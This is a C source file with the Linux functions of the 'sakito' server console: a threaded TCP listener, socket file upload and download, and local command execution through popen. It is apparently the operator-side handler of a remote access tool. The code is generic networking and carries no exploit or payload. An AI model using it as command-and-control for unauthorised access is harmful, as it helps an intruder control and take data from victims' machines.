/*
Coded by d4rkstat1c.
Use educationally/legally.
*/
#define _LARGEFILE64_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <netdb.h>
#include <pthread.h>
#include <sys/sendfile.h>
#include "../headers/nbo_encoding.h"
#include "../headers/sakito_core_funcs.h"
#include "../headers/linux/sakito_slin_types.h"
#include "../headers/sakito_server_common.h"
#include "../headers/sakito_multi_def.h"

void bind_socket(const SOCKET listen_socket);
void s_accept_conns(Server_map* const s_map);

/*
Below contains linux specific sakito API functions.
*/

// Store current working directory in a provided buffer.
void get_cwd(char *buf)
{
	getcwd(buf, BUFLEN);
}

// Write/send data to a given socket file descriptor.
int s_tcp_send(SOCKET socket, char* buf, size_t count)
{
	return write(socket, buf, count);
}

// Read/receive data from a given socket file descriptor.
int s_tcp_recv(SOCKET socket, char* buf, size_t count)
{
	return read(socket, buf, count);
}

// Write to stdout.
int s_write_stdout(const char* buf, size_t count)
{
	return write(STDOUT_FILENO, buf, count);
}

// Close a file descriptor.
void s_close_file(s_file file)
{
	close(file);
}

// Create a socket file descriptor.
int create_socket() 
{
	int listen_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (listen_socket == -1) 
	{
		perror("Socket creation failed.\n");
		exit(1); 
	} 
 
	if (setsockopt(listen_socket, SOL_SOCKET, SO_REUSEADDR, &(int) {1}, sizeof(int)) != 0)
		terminate_server(listen_socket, "Setting socket options failed.\n");
 
	return listen_socket;
}

// Call open() to return s_file which is a typedef alias for int/file descriptors.
s_file s_open_file(const char* filename, int rw_flag) 
{
	// Supports only read/write modes.
	if (rw_flag == WRITE)
		return open(filename, O_CREAT | O_WRONLY | O_TRUNC, S_IRUSR | S_IWUSR);
	else if (rw_flag == READ)
		return open(filename, O_RDONLY);

	return INVALID_FILE;
}

// TCP file transfer logic (receive).
int s_recv_file(const SOCKET socket, s_file file, char* const buf, uint64_t f_size) 
{
	// Varaible to keep track of downloaded data.
	int i_result = SUCCESS;

	do
		i_result = read(socket, buf, BUFLEN);
	while ((i_result > 0) &&
			(write(file, buf, i_result)) &&
			(f_size -= i_result));

	return i_result;
}

// Calculate file size of a given s_file/file descriptor.
uint64_t s_file_size(s_file file) 
{
	uint64_t f_size = (uint64_t)lseek64(file, 0, SEEK_END);
	// Return file descriptor to start of file.
	lseek64(file, 0, SEEK_SET);

	return f_size;
}

// TCP file transfer logic (send).
int s_send_file(int socket, int file, char* const buf, uint64_t f_size) 
{
	// Calculate file size and serialize the file size integer.
	uint64_t no_bytes = htonll(f_size);

	// Send the serialized file size bytes.
	if (write(socket, &no_bytes, sizeof(uint64_t)) < 1)
		return SOCKET_ERROR;

	int i_result = SUCCESS;

	// Stream file at kernel level to client.
	if (f_size > 0)
	{
		while ((i_result != FAILURE) && (f_size > 0))
		{
			i_result = sendfile(socket, file, NULL, f_size);
			f_size -= i_result;
		}
	}

	return i_result;
}

// Execute a command via the host system.
void s_exec_cmd(Server_map* const s_map) 
{
	// Call Popen to execute command(s) and read the processes' output.
	FILE* fpipe = popen(s_map->buf, "r");

	// Stream/write command output to stdout.
	int rb = 0;
	do 
	{
		rb = fread(s_map->buf, 1, BUFLEN, fpipe);
		fwrite(s_map->buf, 1, rb, stdout);
	} while (rb == BUFLEN);
 
	// Close the pipe.
	pclose(fpipe);
}

// Terminating the console application and server. 
void s_terminate_console(Server_map* const s_map) 
{
	// Quit accepting connections.
	pthread_cancel(s_map->acp_thread);

	// if there's any connections close them before exiting.
	if (s_map->clients_sz) 
	{
		for (size_t i = 0; i < s_map->clients_sz; i++)
			close(s_map->clients[i].sock);
		// Free allocated memory.
		free(s_map->clients);
	}

	terminate_server(s_map->listen_socket, NULL);
}

// Thread to recursively accept connections.
void* accept_conns(void* param) 
{
	// Call sakito wrapper function to accept incoming connections.
	Server_map* const s_map = (Server_map*)param;

	// Create our socket object.
	s_map->listen_socket = create_socket();

	// Bind socket to port.
	bind_socket(s_map->listen_socket);

	// Call wrapper function to accept incoming connections.
	s_accept_conns(s_map);

	return NULL;
}

// Initialization API of the console application and server.
void s_init(Server_map* const s_map) 
{
	// Set out race condition flag to false.
	s_map->THRD_FLAG = 0;

	// Start our accept connections thread to recursively accept connections.
	pthread_create(&s_map->acp_thread , NULL, accept_conns, s_map);
}
